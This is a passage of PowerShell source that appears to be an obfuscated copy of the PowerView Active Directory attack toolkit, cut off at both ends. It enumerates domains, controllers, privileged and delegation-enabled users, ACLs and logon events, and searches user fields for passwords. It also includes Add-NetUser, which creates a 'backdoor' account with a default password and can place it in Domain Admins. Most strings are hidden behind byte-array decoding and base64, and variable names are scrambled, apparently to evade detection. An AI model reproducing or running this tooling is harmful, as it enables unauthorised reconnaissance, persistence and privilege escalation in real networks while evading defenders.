        if($Domain) {
            # try to detect a wild card so we use -like
            if($Domain.Contains('*')) {
                (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name -like $Domain}
            }
            else {
                # match the exact domain name if there's not a wildcard
                (Get-NetForest -Forest $Forest).Domains | Where-Object {$_.Name.ToLower() -eq $Domain.ToLower()}
            }
        }
        else {
            # return all domains
            $ntkuQD1 = Get-NetForest -Forest $Forest
            if($ntkuQD1) {
                $ntkuQD1.Domains
            }
        }
    }
}


function Get-NetForestCatalog {
<#
    .SYNOPSIS

        Return all global catalogs for a given forest.

    .PARAMETER Forest

        The forest name to query domain for.

    .EXAMPLE

        PS C:\> Get-NetForestCatalog
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Forest
    )

    process {
        $ntkuQD1 = Get-NetForest -Forest $Forest
        if($ntkuQD1) {
            $ntkuQD1.FindAllGlobalCatalogs()
        }
    }
}


function Get-NetDomainController {
<#
    .SYNOPSIS

        Return the current domain controllers for the active domain.

    .PARAMETER Domain

        The domain to query for domain controllers, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER LDAP

        Switch. Use LDAP queries to determine the domain controllers.

    .EXAMPLE

        PS C:\> Get-NetDomainController -Domain test
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $Domain,

        [String]
        $DomainController,

        [Switch]
        $LDAP
    )

    process {
        if($LDAP -or $DomainController) {
            # filter string to return all domain controllers
            Get-NetComputer -Domain $Domain -DomainController $DomainController -FullData -Filter '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
        }
        else {
            $cYF9amo6 = Get-NetDomain -Domain $Domain
            
            if($cYF9amo6) {
                $cYF9amo6.DomainControllers
            }
        }
    }
}


########################################################
#
# "net *" replacements and other fun start below
#
########################################################

function Get-NetUser {
<#
    .SYNOPSIS

        Query information for a given user or users in the domain
        using ADSI and LDAP. Another -Domain can be specified to
        query for users across a trust.
        Replacement for "net users /domain"

    .PARAMETER UserName

        Username filter string, wildcards accepted.

    .PARAMETER Domain

        The domain to query for users, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"

    .PARAMETER AdminCount

        Switch. Return users with adminCount=1.

    .PARAMETER SPN

        Switch. Only return user objects with non-null service principal names.

    .PARAMETER Unconstrained

        Switch. Return users that have unconstrained delegation.

    .PARAMETER AllowDelegation

        Switch. Return user accounts that are not marked as 'sensitive and not allowed for delegation'

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-NetUser -Domain testing

    .EXAMPLE

        PS C:\> Get-NetUser -ADSpath "LDAP://OU=secret,DC=testlab,DC=local"
#>

    [CmdletBinding()]
    param(
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $UserName,

        [String]
        $Domain,

        [String]
        $DomainController,

        [String]
        $ADSpath,

        [String]
        $Filter,

        [Switch]
        $SPN,

        [Switch]
        $AdminCount,

        [Switch]
        $Unconstrained,

        [Switch]
        $AllowDelegation,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        # so this isn't repeated if users are passed on the pipeline
        $Veud = Get-DomainSearcher -Domain $Domain -ADSpath $ADSpath -DomainController $DomainController -PageSize $PageSize
    }

    process {
        if($Veud) {

            # if we're checking for unconstrained delegation
            if($Unconstrained) {
                Write-Verbose (HandleResult95 @(159,122,201,95,151,122,213,67,172,37,194,84,148,37,152,74,135,0,247,70,151,122,152,70,173,123,243,74,151,31,205,70,148,31,240,84,148,15,247,64,148,31,197,91,170,15,205,69,172,47,156,14) @(206,72,161,51))
                $Filter += (HandleResult95 @(106,47,213,139,209,112,60,99,62,177,191,253,76,33,20,87,210,195,178,93,18,105,45,245,147,207,71,14,109,13,202,132,196,108,39,86,43,233,180,243,101,12,116,86,205,152,191,80,58,75,54,246,190,207,105,12,110,13,179,192,198,66,39,88,40,199,150,251) @(33,103,131,241,139,40,118))
            }
            if($AllowDelegation) {
                Write-Verbose (HandleResult95 @(65,53,122,72,27,67,95,243,114,106,113,67,24,28,18,250,89,79,68,94,24,41,97,249,89,79,118,75,32,8,105,233,73,80,38,67,27,28,126,228,74,64,68,87,24,38,79,235,116,64,68,79) @(16,7,18,36,66,113,43,131))
                # negation of "Accounts that are sensitive and not trusted for delegation"
                $Filter += (HandleResult95 @(16,203,114,255,97,66,21,228,84,251,67,112,2,186,14,161,103,116,9,204,85,162,48,42,56,229,14,227,74,112,30,253,122,249,49,46,21,204,118,229,72,78,30,242,121,196,80,40,23,226,114,229,75,89,111,188,122,212,72,44,11,220,114,231,75,94,60,185,121,234,84,106,16,217,10,173) @(91,136,55,144,5,26))
            }
            if($AdminCount) {
                Write-Verbose (HandleResult95 @(172,128,6,73,199,171,178,141,208,3,70,249,195,171,196,203,39,98,216,242,164,170,222,27,116,172,160,247,159,220,63,28,211,200,251,192) @(253,178,110,37,158,153,198))
                $Filter += (HandleResult95 @(137,243,95,209,128,58,18,14,155,134,32,139,128,3,47,66,143,231,114,135) @(194,180,25,186,226,109,126,123))
            }

            # check if we're using a username filter or not
            if($UserName) {
                # samAccountType=805306368 indicates user objects
                $Veud.filter=((HandleResult95 @(159,241,10,255,195,62,250,160,227,4,222,202,110,143,130,199,55,214,242,57,223,147,231,106,223,228,77,141,153,200,18,162,237,118,229,224,249,0,248,218,85,235,229,240,10,162,238,122,216,131,135,99,196,205,74,200,142,230,99,173) @(212,178,83,144,160,12,188)) + $UserName + ")" + $Filter + ")")
            }
            elseif($SPN) {
                $Veud.filter=((HandleResult95 @(151,46,102,58,199,238,43,75,4,243,146,7,93,102,242,169,9,121,7,145,191,42,106,108,235,152,44,14,24,222,157,95,114,47,253,232,38,108,61,222,134,53,117,103,197,139,35,83,0,236,150,29,93,56,234,172,14,120,19,215,136,0,121,33,254,136,93,78,30,245,225,80) @(220,109,63,85,164)) + $Filter + ")")
            }
            else {
                # filter is something like "(samAccountName=*blah*)" if specified
                $Veud.filter=((HandleResult95 @(49,66,55,227,204,35,233,14,80,57,194,197,115,156,44,116,10,202,253,36,204,61,84,87,195,235,80,158,55,123,47,190,226,107,246,78,74,63,177,146) @(122,1,110,140,175,17,175)) + $Filter + ")")
            }

            $Veud.FindAll() | Where-Object {$_} | ForEach-Object {
                # convert/process the LDAP fields for each result
                Convert-LDAPProperty -Properties $_.Properties
            }
        }
    }
}


function Add-NetUser {
<#
    .SYNOPSIS

        Adds a domain user or a local user to the current (or remote) machine,
        if permissions allow, utilizing the WinNT service provider and
        DirectoryServices.AccountManagement, respectively.
        
        The default behavior is to add a user to the local machine.
        An optional group name to add the user to can be specified.

    .PARAMETER UserName

        The username to add. If not given, it defaults to 'backdoor'

    .PARAMETER Password

        The password to set for the added user. If not given, it defaults to 'Password123!'

    .PARAMETER GroupName

        Group to optionally add the user to.

    .PARAMETER ComputerName

        Hostname to add the local user to, defaults to 'localhost'

    .PARAMETER Domain

        Specified domain to add the user to.

    .EXAMPLE

        PS C:\> Add-NetUser -UserName john -Password 'Password123!'
        
        Adds a localuser 'john' to the local machine with password of 'Password123!'

    .EXAMPLE

        PS C:\> Add-NetUser -UserName john -Password 'Password123!' -ComputerName server.testlab.local
        
        Adds a localuser 'john' with password of 'Password123!' to server.testlab.local's local Administrators group.

    .EXAMPLE

        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain ''
        
        Adds the user "john" with password "password" to the current domain and adds
        the user to the domain group "Domain Admins"

    .EXAMPLE

        PS C:\> Add-NetUser -UserName john -Password password -GroupName "Domain Admins" -Domain 'testing'
        
        Adds the user "john" with password "password" to the 'testing' domain and adds
        the user to the domain group "Domain Admins"

    .Link

        http://blogs.technet.com/b/heyscriptingguy/archive/2010/11/23/use-powershell-to-create-local-user-accounts.aspx
#>

    [CmdletBinding()]
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName = 'backdoor',

        [ValidateNotNullOrEmpty()]
        [String]
        $Password = 'Password123!',

        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName = 'localhost',

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain
    )

    if ($Domain) {

        $n5RRH = Get-NetDomain -Domain $Domain
        if(-not $n5RRH) {
            Write-Warning ((HandleResult95 @(230,81,216,198,74,40,90,211,104,197,139,79,65,32,254,97,203,210,98,107,113,217,106,245) @(180,9,146,191,40,27,19)) + $Domain + (HandleResult95 @(131,90,202,243,37,32,16,138,174,92,206,167) @(202,29,243,154,68,77,70,224)))
            return $Null
        }

        # add the assembly we need
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement

        # http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
        # get the domain context
        $DyfM = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList ([System.DirectoryServices.AccountManagement.ContextType]::Domain), $n5RRH

        # create the user object
        $m342PSR = New-Object -TypeName System.DirectoryServices.AccountManagement.UserPrincipal -ArgumentList $DyfM

        # set user properties
        $m342PSR.Name = $UserName
        $m342PSR.SamAccountName = $UserName
        $m342PSR.PasswordNotRequired = $False
        $m342PSR.SetPassword($Password)
        $m342PSR.Enabled = $True

        Write-Verbose ((HandleResult95 @(234,99,217,62,183,231,252,135,217,61,240,53,138,231,224,155,216,57,210,111) @(187,80,147,82,238,191,174,247)) + $UserName + (HandleResult95 @(110,26,201,4,110,26,255,2,67,21,252,21,68,21,221,8,68,97,255,4,68,63,202,21,109,37,166,79) @(39,82,155,114)) + $Password + (HandleResult95 @(89,161,61,126,113,177,61,101,113,234,78,102,114,143,75,105) @(19,216,127,14)) + $Domain)

        try {
            # commit the user
            $m342PSR.Save()
            ((HandleResult95 @(50,93,49,55,44,98,23,41,63,124,8,52) @(101,36,65,83)) + $UserName + (HandleResult95 @(149,93,105,46,70,238,91,75,124,44,146,120,67,72,103,175,112,116,93,117,191,120,113,119,123,155,67,76,86,88,176,96,110,88,77,170,119,112,89,111,190,124,102,34) @(220,21,39,31,31)) + $Domain)
        }
        catch {
            Write-Warning '[!] User already exists!'
            return
        }
    }
    else {
        
        Write-Verbose ((HandleResult95 @(244,219,2,197,182,188,8,0,199,133,43,206,139,188,20,28,198,129,9,148) @(165,232,72,169,239,228,90,112)) + $UserName + (HandleResult95 @(230,196,200,247,230,196,254,241,203,203,253,230,204,203,220,251,204,191,254,247,204,225,203,230,229,251,167,188) @(175,140,154,129)) + $Password + (HandleResult95 @(230,66,179,184,206,82,176,243) @(172,59,241,206)) + $ComputerName)

        # if it's not a domain add, it's a local machine add
        $d7ztB5J = [ADSI]((HandleResult95 @(220,214,160,7,222,136,157,68,198,157,244,79) @(138,228,204,114)) + $ComputerName)
        $aQmp = $d7ztB5J.Create('User', $UserName)
        $aQmp.SetPassword($Password)

        # commit the changes to the local machine
        try {
            $Null = $aQmp.SetInfo()
            ((HandleResult95 @(178,76,252,111,172,115,218,113,191,109,197,108) @(229,53,140,11)) + $UserName + (HandleResult95 @(81,29,235,150,159,245,117,115,123,102,235,202,162,144,67,108,125,6,231,205,165,170,109,119,124,18,243,204,143,128,2,106,81,18,205,209,165,244,106,120) @(24,85,165,167,198,199,59,31)) + $ComputerName)
        }
        catch {
            Write-Warning '[!] Account already exists!'
            return
        }
    }

    # if a group is specified, invoke Add-NetGroupUser and return its value
    if ($GroupName) {
        # if we're adding the user to a domain
        if ($Domain) {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -Domain $Domain
            ((HandleResult95 @(62,114,0,168,25,16,40,19,81,40,133,55) @(105,11,112,204,80,86,126)) + $UserName + (HandleResult95 @(135,252,24,222,151,134,24,131,173,135,24,130,170,227,46,156,171,231,20,135,148,243,4,131,148,247,20,223,172,205,20,129,173,217,111,222,173,247,23,210) @(206,180,86,239)) + $GroupName + (HandleResult95 @(35,36,124,74,149,45,49,102,93,139,44,19,114,86,157,87) @(106,99,16,63,220)) + $Domain)
        }
        # otherwise, we're adding to a local group
        else {
            Add-NetGroupUser -UserName $UserName -GroupName $GroupName -ComputerName $ComputerName
            ((HandleResult95 @(68,129,139,102,90,190,173,120,73,160,178,101) @(19,248,251,2)) + $UserName + (HandleResult95 @(22,214,7,99,6,172,7,62,60,173,7,63,59,201,49,33,58,205,11,58,5,217,27,62,5,221,11,98,61,231,11,60,60,243,112,99,60,221,8,111) @(95,158,73,82)) + $GroupName + (HandleResult95 @(228,193,223,36,9,172,61,219,229,213,0,39) @(173,134,230,81,64,235,85)) + $ComputerName)
        }
    }
}


function Add-NetGroupUser {
<#
    .SYNOPSIS

        Adds a user to a domain group or a local group on the current (or remote) machine,
        if permissions allow, utilizing the WinNT service provider and
        DirectoryServices.AccountManagement, respectively.

    .PARAMETER UserName

        The domain username to query for.

    .PARAMETER GroupName

        Group to add the user to.

    .PARAMETER ComputerName

        Hostname to add the user to, defaults to localhost.

    .PARAMETER Domain

        Domain to add the user to.

    .EXAMPLE

        PS C:\> Add-NetGroupUser -UserName john -GroupName Administrators
        
        Adds a localuser "john" to the local group "Administrators"

    .EXAMPLE

        PS C:\> Add-NetGroupUser -UserName john -GroupName "Domain Admins" -Domain dev.local
        
        Adds the existing user "john" to the domain group "Domain Admins" in "dev.local"
#>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserName,

        [Parameter(Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $GroupName,

        [ValidateNotNullOrEmpty()]
        [Alias('HostName')]
        [String]
        $ComputerName,

        [String]
        $Domain
    )

    # add the assembly if we need it
    Add-Type -AssemblyName System.DirectoryServices.AccountManagement

    # if we're adding to a remote host's local group, use the WinNT provider
    if($ComputerName -and ($ComputerName -ne (HandleResult95 @(170,204,55,227,7,40,229,167,233,61,199,110) @(200,139,14,137,94,127,157)))) {
        try {
            Write-Verbose ((HandleResult95 @(148,28,189,9,152,252,240,37,166,42,175,209,159,19,166,5) @(197,75,239,98,249,171)) + $UserName + (HandleResult95 @(81,107,238,16,22,89,30,129) @(24,35,188,102,95)) + $GroupName + (HandleResult95 @(94,116,104,182,130,80,91,39,160,248,70,84) @(23,51,81,195,203)) + $ComputerName)
            ([ADSI]((HandleResult95 @(151,143,197,201,104,184,149,23,141,196,145,129) @(193,189,169,188,60,212,196,33)) + $ComputerName + "/" + $GroupName + (HandleResult95 @(211,208,17,88,253,164,35,86) @(159,151,117,33)))).add(((HandleResult95 @(203,255,168,40,107,160,196,230,209,180,252,96) @(157,205,196,93,63,204,149,208)) + $ComputerName + "/" + $UserName + (HandleResult95 @(247,51,204,121,225,35,211,62) @(187,123,154,3))))
            ((HandleResult95 @(202,194,14,120,9,219,237,4,70,24,212,220) @(157,187,126,28,64)) + $UserName + (HandleResult95 @(68,153,225,242,72,63,159,195,160,34,67,188,203,148,105,126,180,252,129,121,87,150,253,175,75,78,147,159,161,104,79,191,204,174,40,60,178,236,130,44) @(13,209,175,195,17)) + $GroupName + (HandleResult95 @(107,134,23,206,190,186,244,245) @(34,193,46,187,247,251,201,200)) + $ComputerName)
        }
        catch {
            Write-Warning ((HandleResult95 @(241,30,197,22,85,104,65,78,197,10,186,11,85,106,81,92,252,32,239,7,70,84,85,6,197,85,213,11,85,108,42,10) @(166,103,131,114,28,45,23,55)) + $UserName + (HandleResult95 @(174,45,38,105,0,226,243,125,133,86,34,104,0,228,170,57) @(231,101,116,31,73,165,151,4)) + $GroupName + (HandleResult95 @(24,51,65,199,53,206,129,108) @(81,116,120,178,124,143,188)) + $ComputerName)
            return
        }
    }

    # otherwise it's a local machine or domain add
    else {
        try {
            if ($Domain) {
                Write-Verbose ((HandleResult95 @(23,28,254,169,116,17,126,194,139,93,16,49,246,154,92,33) @(70,75,172,194,21)) + $UserName + (HandleResult95 @(113,158,4,30,113,151,107,85) @(56,214,86,104)) + $GroupName + (HandleResult95 @(94,178,156,35,26,122,69,131,199,1,21,77,117,156,228,107) @(23,245,165,86,83,61)) + $Domain)
                $D7tgKeZb = [System.DirectoryServices.AccountManagement.ContextType]::Domain
                $n5RRH = Get-NetDomain -Domain $Domain
                if(-not $n5RRH) {
                    return $Null
                }
                # get the full principal context
                $DyfM = New-Object -TypeName System.DirectoryServices.AccountManagement.PrincipalContext -ArgumentList $D7tgKeZb, $n5RRH            
            }
            else {
                # otherwise, get the local machine context
                Write-Verbose ((HandleResult95 @(226,190,254,176,52,228,220,194,146,29,229,147,246,131,28,212) @(179,233,172,219,85)) + $UserName + (HandleResult95 @(169,141,246,82,169,132,153,25) @(224,197,164,36)) + $GroupName + (HandleResult95 @(40,65,60,95,40,65,125,92,56,52,67,89,0,65,60,80,5,71,56,23) @(97,6,5,42)))
                $DyfM = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine, $Env:ComputerName)
            }

            # find the particular group
            $ayFBYTwN = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity($DyfM,$GroupName)

            # add the particular user to the group
            $ayFBYTwN.Members.add($DyfM, [System.DirectoryServices.AccountManagement.IdentityType]::SamAccountName, $UserName)

            # commit the changes
            $ayFBYTwN.Save()
        }
        catch {
            Write-Warning ((HandleResult95 @(68,91,15,166,172,158,28,105,79,84,23,180,175,250,96,96,95,66,120,226) @(22,3,69,223,206,173,85,14)) + $UserName + (HandleResult95 @(143,93,168,82,143,84,199,25) @(198,21,250,36)) + $GroupName + (HandleResult95 @(30,21,219,28) @(87,81,180,123,254)) + $_)
        }
    }
}


function Get-UserProperty {
<#
    .SYNOPSIS

        Returns a list of all user object properties. If a property
        name is specified, it returns all [user:property] values.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

    .PARAMETER Properties

        Property names to extract for users.

    .PARAMETER Domain

        The domain to query for user properties, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-UserProperty -Domain testing
        
        Returns all user properties for users in the 'testing' domain.

    .EXAMPLE

        PS C:\> Get-UserProperty -Properties ssn,lastlogon,location
        
        Returns all an array of user/ssn/lastlogin/location combinations
        for users in the current domain.

    .LINK

        http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html
#>

    [CmdletBinding()]
    param(
        [String[]]
        $Properties,

        [String]
        $Domain,
        
        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    if($Properties) {
        # extract out the set of all properties for each object
        $Properties = ,(HandleResult95 @(66,181,233,20,59,157,118,29) @(32,216,175,96,97,204,75)) + $Properties
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -Property $Properties
    }
    else {
        # extract out just the property names
        Get-NetUser -Domain $Domain -DomainController $DomainController -PageSize $PageSize | Select-Object -First 1 | Get-Member -MemberType *Property | Select-Object -Property 'Name'
    }
}


function Find-UserField {
<#
    .SYNOPSIS

        Searches user object fields for a given word (default *pass*). Default
        field being searched is 'description'.

        Taken directly from @obscuresec's post:
            http://obscuresecurity.blogspot.com/2014/04/ADSISearcher.html

    .PARAMETER SearchTerm

        Term to search for, default of "pass".

    .PARAMETER SearchField

        User field to search, default of "description".

    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER Domain

        Domain to search computer fields for, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Find-UserField -SearchField info -SearchTerm backup

        Find user accounts with "backup" in the "info" field.
#>

    [CmdletBinding()]
    param(
        [Parameter(Position=0,ValueFromPipeline=$True)]
        [String]
        $SearchTerm = 'pass',

        [String]
        $SearchField = 'description',

        [String]
        $ADSpath,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    process {
        Get-NetUser -ADSpath $ADSpath -Domain $Domain -DomainController $DomainController -Filter ("(" + $SearchField + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PSo="))) + $SearchTerm + ([char]0x2a+[char]0x29)) -PageSize $PageSize | Select-Object samaccountname,$SearchField
    }
}


function Get-UserEvent {
<#
    .SYNOPSIS

        Dump and parse security events relating to an account logon (ID 4624)
        or a TGT request event (ID 4768). Intended to be used and tested on
        Windows 2008 Domain Controllers.
        Admin Reqd? YES

        Author: @sixdub

    .PARAMETER ComputerName

        The computer to get events from. Default: Localhost

    .PARAMETER EventType

        Either 'logon', 'tgt', or 'all'. Defaults: 'logon'

    .PARAMETER DateStart

        Filter out all events before this date. Default: 5 days
   
    .EXAMPLE

        PS C:\> Get-UserEvent -ComputerName DomainController.testlab.local

    .LINK

        http://www.sixdub.net/2014/11/07/offensive-event-parsing-bringing-home-trophies/
#>

    Param(
        [String]
        $ComputerName = $Env:ComputerName,

        [String]
        [ValidateSet((HandleResult95 @(191,11,239,135,150,149,194,75) @(221,76,214,233,244,167,246,118)),(HandleResult95 @(97,201,80,97) @(5,142,52,81,102)),(HandleResult95 @(21,80,10,58) @(76,7,114,73,1,53)))]
        $EventType = (HandleResult95 @(208,60,13,55,238,128,79,9) @(178,123,52,89,140)),

        [DateTime]
        $DateStart=[DateTime]::Today.AddDays(-5)
    )

    if($EventType.ToLower() -like (HandleResult95 @(147,120,145,37,76,229,197,2) @(241,63,168,75,46,215))) {
        [Int32[]]$tLgTK = @(4624)
    }
    elseif($EventType.ToLower() -like (HandleResult95 @(95,79,112,24) @(59,8,20,40,86,140,216))) {
        [Int32[]]$tLgTK = @(4768)
    }
    else {
        [Int32[]]$tLgTK = @(4624, 4768)
    }

    #grab all events matching our filter for the specified host
    Get-WinEvent -ComputerName $ComputerName -FilterHashTable @{ LogName = 'Security'; ID=$tLgTK; StartTime=$DateStart} -ErrorAction SilentlyContinue | ForEach-Object {

        if($tLgTK -contains 4624) {    
            # first parse and check the logon event type. This could be later adapted and tested for RDP logons (type 10)
            if($_.message -match '(?s)(?<=Logon Type:).*?(?=(Impersonation Level:|New Logon:))') {
                if($Matches) {
                    $Cv9eCCP = $Matches[0].trim()
                    $Matches = $Null
                }
            }
            else {
                $Cv9eCCP = ""
            }

            # interactive logons or domain logons
            if (($Cv9eCCP -eq 2) -or ($Cv9eCCP -eq 3)) {
                try {
                    # parse and store the account used and the address they came from
                    if($_.message -match '(?s)(?<=New Logon:).*?(?=Process Information:)') {
                        if($Matches) {
                            $UserName = $Matches[0].split(([char]0x0a))[2].split(":")[1].trim()
                            $Domain = $Matches[0].split(([char]0x0a))[3].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }
                    if($_.message -match '(?s)(?<=Network Information:).*?(?=Source Port:)') {
                        if($Matches) {
                            $vEfX4aEW = $Matches[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cg=="))))[2].split(":")[1].trim()
                            $Matches = $Null
                        }
                    }

                    # only add if there was account information not for a machine or anonymous logon
                    if ($UserName -and (-not $UserName.endsWith('$')) -and ($UserName -ne 'ANONYMOUS LOGON')) {
                        $Tdjm4byC = @{
                            'Domain' = $Domain
                            'ComputerName' = $ComputerName
                            'Username' = $UserName
                            'Address' = $vEfX4aEW
                            'ID' = '4624'
                            'LogonType' = $Cv9eCCP
                            'Time' = $_.TimeCreated
                        }
                        New-Object -TypeName PSObject -Property $Tdjm4byC
                    }
                }
                catch {
                    Write-Debug ((HandleResult95 @(230,218,139,104,120,254,99,211,225,134,87,99,174,24,216,247,155,104,88,161,78,217,212,180,117,89,143,89,214,176,165,107,85,164,107,137) @(180,130,193,17,26,205,42)) + $_)
                }
            }
        }
        if($tLgTK -contains 4768) {
            # the TGT event type
            try {
                if($_.message -match '(?s)(?<=Account Information:).*?(?=Service Information:)') {
                    if($Matches) {
                        $Username = $Matches[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cg=="))))[1].split(":")[1].trim()
                        $Domain = $Matches[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cg=="))))[2].split(":")[1].trim()
                        $Matches = $Null
                    }
                }

                if($_.message -match '(?s)(?<=Network Information:).*?(?=Additional Information:)') {
                    if($Matches) {
                        $vEfX4aEW = $Matches[0].split(([char]0x0a))[1].split(":")[-1].trim()
                        $Matches = $Null
                    }
                }

                $Tdjm4byC = @{
                    'Domain' = $Domain
                    'ComputerName' = $ComputerName
                    'Username' = $UserName
                    'Address' = $vEfX4aEW
                    'ID' = '4768'
                    'LogonType' = ''
                    'Time' = $_.TimeCreated
                }

                New-Object -TypeName PSObject -Property $Tdjm4byC
            }
            catch {
                Write-Debug ((HandleResult95 @(150,3,118,42,55,90,141,60,95,20,19,16,167,105,80,38,15,16,134,55,88,62,3,28,160,24,126,32,55,91,160,33,115,58,20,84) @(196,91,60,83,85,105)) + $_)
            }
        }
    }
}


function Get-ObjectAcl {
<#
    .SYNOPSIS
        Returns the ACLs associated with a specific active directory object.

        Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.

    .PARAMETER SamAccountName

        Object name to filter for.        

    .PARAMETER Name

        Object name to filter for.

    .PARAMETER DistinguishedName

        Object distinguished name to filter for.

    .PARAMETER ResolveGUIDs

        Switch. Resolve GUIDs to their display names.

    .PARAMETER Filter

        A customized ldap filter string to use, e.g. "(description=*admin*)"
     
    .PARAMETER ADSpath

        The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
        Useful for OU queries.

    .PARAMETER ADSprefix

        Prefix to set for the searcher (like "CN=Sites,CN=Configuration")

    .PARAMETER RightsFilter

        Only return results with the associated rights, "All", "ResetPassword","WriteMembers"

    .PARAMETER Domain

        The domain to use for the query, defaults to the current domain.

    .PARAMETER DomainController

        Domain controller to reflect LDAP queries through.

    .PARAMETER PageSize

        The PageSize to set for the LDAP searcher object.

    .EXAMPLE

        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local
        
        Get the ACLs for the matt.admin user in the testlab.local domain

    .EXAMPLE

        PS C:\> Get-ObjectAcl -SamAccountName matt.admin -domain testlab.local -ResolveGUIDs
        
        Get the ACLs for the matt.admin user in the testlab.local domain and
        resolve relevant GUIDs to their display names.
#>

    [CmdletBinding()]
    Param (
        [Parameter(ValueFromPipeline=$True)]
        [String]
        $SamAccountName,

        [String]
        $Name = "*",

        [Alias('DN')]
        [String]
        $DistinguishedName = "*",

        [Switch]
        $ResolveGUIDs,

        [String]
        $Filter,

        [String]
        $ADSpath,

        [String]
        $ADSprefix,

        [String]
        [ValidateSet((HandleResult95 @(180,147,4,60) @(229,196,124,79,85,132,120,49)),(HandleResult95 @(122,147,5,87,154,215,20,126,167,11,99,186,235,116,22,135,9,108,253,178) @(47,254,83,45,192,143,70)),(HandleResult95 @(153,12,176,184,171,120,172,134,149,104,203,161,149,103,176,178) @(207,63,250,200)))]
        $RightsFilter,

        [String]
        $Domain,

        [String]
        $DomainController,

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200
    )

    begin {
        $rW6p = Get-DomainSearcher -Domain $Domain -DomainController $DomainController -ADSpath $ADSpath -ADSprefix $ADSprefix -PageSize $PageSize

        # get a GUID -> name mapping
        if($ResolveGUIDs) {
            $NbbUfhH = Get-GUIDMap -Domain $Domain -DomainController $DomainController -PageSize $PageSize
        }
    }

    process {

        if ($rW6p) {

            if($SamAccountName) {
                $rW6p.filter=((HandleResult95 @(228,24,106,135,0,10,233,47,106,191,45,82,205,104,101,157,7,127,154,51,81,191,54,1) @(175,91,51,232,99,56)) + $SamAccountName + (HandleResult95 @(98,191,22,168,76,210,24,128,46,140,40,184) @(41,236,126,221,21,133)) + $Name + (HandleResult95 @(177,164,216,244,155,175,254,175,155,160,133,241,158,160,220,229,155,176,230,244,152,154,246,235,160,163,128,162) @(250,247,176,159)) + $DistinguishedName + ")" + $Filter + ")")  
            }
            else {
                $rW6p.filter=((HandleResult95 @(115,174,117,182,180,156,126,153,118,141,230,204) @(56,237,44,217,214,241)) + $Name + (HandleResult95 @(160,245,82,125,18,145,165,150,91,65,70,167,143,241,86,108,18,142,189,205,88,123,53,189,177,242,10,43) @(235,166,58,22,115,201)) + $DistinguishedName + ")" + $Filter + ")")  
            }
  
            try {
                $rW6p.FindAll() | Where-Object {$_} | Foreach-Object {
                    $Object = [adsi]($_.path)
                    if($Object.distinguishedname) {
                        $Pu7AlyM = $Object.PsBase.ObjectSecurity.access
                        $Pu7AlyM | ForEach-Object {
                            $_ | Add-Member NoteProperty 'ObjectDN' ($Object.distinguishedname[0])

                            if($Object.objectsid[0]){
                                $SUES9Df7 = (New-Object System.Security.Principal.SecurityIdentifier($Object.objectsid[0],0)).Value
                            }
                            else {
                                $SUES9Df7 = $Null
                            }
                            
                            $_ | Add-Member NoteProperty 'ObjectSID' $SUES9Df7
                            $_
                        }
                    }
                } | ForEach-Object {
                    if($RightsFilter) {
                        $VTpe = Switch ($RightsFilter) {
